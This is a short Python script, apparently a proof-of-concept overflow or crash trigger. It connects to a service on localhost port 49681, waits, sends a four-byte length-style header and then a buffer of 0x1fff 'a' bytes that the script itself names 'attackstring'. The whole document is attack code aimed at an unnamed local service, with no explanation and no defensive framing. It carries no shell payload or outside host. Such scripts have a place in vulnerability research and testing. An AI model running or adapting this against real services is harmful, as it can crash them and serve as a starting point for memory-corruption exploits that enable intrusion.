import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 49681))

time.sleep(8)

s.sendall("\xff\x1f\x00\x00");

attackstring = "a" * 0x1fff
s.sendall(attackstring);
